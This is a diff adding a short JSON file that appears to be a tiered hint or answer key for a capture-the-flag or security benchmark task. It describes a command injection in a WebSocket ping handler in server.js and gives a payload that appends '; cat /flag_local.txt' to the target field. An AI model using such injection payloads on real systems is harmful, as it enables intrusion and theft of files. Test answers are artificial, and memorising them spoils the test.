@@ -1,0 +1,4 @@
+{
+  "tier1": "Command injection via WebSocket diagnostic command",
+  "tier2": "server.js wss.on(\"message\") line 191 \u2014 target is interpolated unsanitized into a shell string: \"/bin/sh -c 'ping -c1 ${target}'\"; send JSON {\"cmd\":\"ping\",\"target\":\"127.0.0.1; cat /flag_local.txt\"} over an authenticated WebSocket connection"
+}
